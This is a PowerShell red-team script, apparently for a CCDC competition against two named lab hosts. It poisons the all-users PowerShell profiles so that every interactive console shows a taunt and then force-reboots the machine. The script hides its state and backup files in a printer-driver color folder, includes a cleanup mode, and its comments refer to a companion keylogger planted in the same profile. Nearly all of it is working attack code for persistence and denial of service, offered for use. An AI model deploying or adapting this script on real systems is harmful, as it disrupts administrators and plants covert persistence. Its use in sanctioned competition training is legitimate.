#Requires -RunAsAdministrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Nov 21 2026 -- PowerShell Profile Reboot Poison
# Targets: 172.20.240.100 (AD) and 172.20.240.120 (MSSQL)
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
# Linux analogy:
#   Plant target = C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1
#                ≈ /etc/bash.bashrc
#   Payload      = Restart-Computer -Force after a 3-sec taunt
#                ≈ exec 'shutdown -r now' at the top of /etc/bash.bashrc
#   Effect       = every interactive PS console that loads the profile
#                  force-reboots the machine
#
# Guard: $Host.Name -eq 'ConsoleHost'
#   ≈ [[ -t 0 ]] in bash -- true only in an interactive terminal.
#   Without this, background PS (scheduled tasks, WMI runners, services)
#   also hits the payload, turning a targeted troll into a boot loop.
#
# Conflict note: same target file as 06_shell_poison.ps1.
#   Whichever script ran last wins. Recommended order:
#     1. Deploy 06 (keylogger) at match start -- watch them work
#     2. Deploy 07 (reboot) when you want chaos -- they can't even open PS
#
# Covers both Windows PowerShell 5.1 and PowerShell 7 (if installed).
#
# Usage:
#   .\07_reboot_poison.ps1 deploy
#   .\07_reboot_poison.ps1 cleanup
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

param([Parameter(Position=0)][string]$Mode = "deploy")

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }

$StateDir = "C:\Windows\System32\spool\drivers\color"
$StateFile = "$StateDir\.rt21-reboot-poison.json"

# PS 5.1 all-users, all-hosts profile -- Linux: /etc/bash.bashrc
$Profile51 = "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"
# PS 7 equivalent (only exists if PS 7 is installed)
$Profile7  = "$env:ProgramFiles\PowerShell\7\profile.ps1"

Write-Host ""
Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
Write-Host "   Nov 21 2026 -- PS Profile Reboot Poison"             -ForegroundColor Yellow
Write-Host "   Every interactive PS window force-reboots the box"   -ForegroundColor Yellow
Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed
Write-Host ""

# The poison payload -- wrapped in ConsoleHost guard so background PS is unaffected
# (Linux analogy: [[ -t 0 ]] check before the shutdown command)
$poisonBlock = @'

# -- rt21-reboot --
if ($Host.Name -eq 'ConsoleHost') {
    Write-Host ""
    Write-Host "  ============================================" -ForegroundColor Red
    Write-Host "  ||   YOU HAVE BEEN  F O O T  S H O T    ||" -ForegroundColor Red
    Write-Host "  ||   Rebooting in 3 seconds...           ||" -ForegroundColor Red
    Write-Host "  ||   Recovery: powershell -NoProfile     ||" -ForegroundColor Red
    Write-Host "  ============================================" -ForegroundColor Red
    Write-Host ""
    Start-Sleep -Seconds 3
    Restart-Computer -Force
}
# -- /rt21-reboot --
'@

function Poison-Profile {
    param([string]$Path)
    $dir = Split-Path $Path -Parent
    if (-not (Test-Path $dir)) { return $false }

    $backup = $null
    if (Test-Path $Path) {
        $existing = Get-Content $Path -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
        if ($existing -match '# -- rt21-reboot --') {
            Write-Info "Already poisoned: $Path"
            return $true
        }
        # Back up original
        $backup = "$StateDir\.rt21-reboot-bk-$([System.IO.Path]::GetFileNameWithoutExtension($Path)).ps1"
        Copy-Item $Path $backup -Force -ErrorAction SilentlyContinue

        # Prepend payload -- fires before any existing profile content
        $newContent = $poisonBlock + "`r`n`r`n# --- original profile ---`r`n" + $existing
        Set-Content -Path $Path -Value $newContent -Encoding UTF8 -Force
        Write-Success "Prepended to existing profile: $Path"
    } else {
        Set-Content -Path $Path -Value $poisonBlock -Encoding UTF8 -Force
        Write-Success "Created poisoned profile: $Path"
    }
    return $backup
}

switch ($Mode.ToLower()) {

"deploy" {
    New-Item -Path $StateDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

    $state = @{ deployed_at = (Get-Date -Format "o"); profiles = @() }

    Write-Section "Poisoning PS 5.1 profile"
    $bk51 = Poison-Profile -Path $Profile51
    $state["profiles"] += @{ path = $Profile51; backup = $bk51 }

    Write-Section "Poisoning PS 7 profile (if installed)"
    if (Test-Path (Split-Path $Profile7 -Parent)) {
        $bk7 = Poison-Profile -Path $Profile7
        $state["profiles"] += @{ path = $Profile7; backup = $bk7 }
    } else {
        Write-Info "PS 7 not installed -- skipping"
    }

    $state | ConvertTo-Json -Depth 5 | Set-Content -Path $StateFile -Encoding UTF8 -Force
    Write-Success "State: $StateFile"

    Write-Host ""
    Write-Host " -- Summary -------------------------------------------" -ForegroundColor Green
    Write-Host "   Target : AllUsersAllHosts PS profile (5.1 + PS7 if present)" -ForegroundColor Gray
    Write-Host "   Effect : interactive PS console -> 3s taunt -> forced reboot" -ForegroundColor Gray
    Write-Host "   Safe   : background PS (tasks/WMI/services) unaffected (ConsoleHost guard)" -ForegroundColor Gray
    Write-Host "   Recovery (blue team): powershell.exe -NoProfile, then delete profile" -ForegroundColor DarkGray
    Write-Host " -------------------------------------------------------" -ForegroundColor Green
}

"cleanup" {
    $state = $null
    if (Test-Path $StateFile) {
        try { $state = Get-Content $StateFile -Raw -Encoding UTF8 | ConvertFrom-Json
        } catch { Write-Warn "State parse failed -- blind cleanup" }
    }

    Write-Section "Restoring profiles"

    $targets = @($Profile51)
    if (Test-Path (Split-Path $Profile7 -Parent)) { $targets += $Profile7 }

    foreach ($path in $targets) {
        if (-not (Test-Path $path)) { Write-Info "Not present: $path"; continue }

        # Try state-backed restore first
        $entry = $null
        if ($state -and $state.profiles) {
            $entry = $state.profiles | Where-Object { $_.path -eq $path } | Select-Object -First 1
        }

        if ($entry -and $entry.backup -and (Test-Path $entry.backup)) {
            Copy-Item $entry.backup $path -Force -ErrorAction Stop
            Remove-Item $entry.backup -Force -ErrorAction SilentlyContinue
            Write-Success "Restored from backup: $path"
        } else {
            # Strip the rt21-reboot block
            $content = Get-Content $path -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
            if ($content -match '# -- rt21-reboot --') {
                $cleaned = $content -replace '(?s)\r?\n# -- rt21-reboot --.*?# -- /rt21-reboot --\r?\n', ''
                # Also strip the separator line if profile was originally empty
                $cleaned = $cleaned -replace '\r?\n# --- original profile ---\r?\n', ''
                if ($cleaned.Trim() -eq '') {
                    Remove-Item $path -Force -ErrorAction SilentlyContinue
                    Write-Success "Profile was poison-only -- deleted: $path"
                } else {
                    Set-Content $path -Value $cleaned -Encoding UTF8 -Force
                    Write-Success "Poison block stripped: $path"
                }
            } else {
                Write-Info "No rt21 block found: $path"
            }
        }
    }

    Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
    Write-Success "Cleanup complete"
}

default {
    Write-Err "Usage: .\07_reboot_poison.ps1 [deploy|cleanup]"
    exit 1
}

}
